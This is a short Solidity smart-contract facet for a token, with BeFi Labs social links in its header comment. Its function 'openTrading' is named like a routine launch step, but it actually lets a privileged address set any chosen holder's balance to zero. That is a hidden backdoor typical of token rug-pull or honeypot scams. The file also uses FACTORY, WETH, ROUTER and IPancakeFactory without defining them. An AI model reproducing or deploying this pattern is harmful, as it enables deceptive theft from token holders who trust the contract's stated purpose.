/*  
   * SPDX-License-Identifier: MIT

    // Telegram: https://t.me/BeFiLabsAnn
    // Twitter: https://twitter.com/BefiLabs
    // Website: https://befilabs.com/
    // Discord: https://discord.com/invite/asvrdMp9e8
    // Medium:  https://befilabs.medium.com/
*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
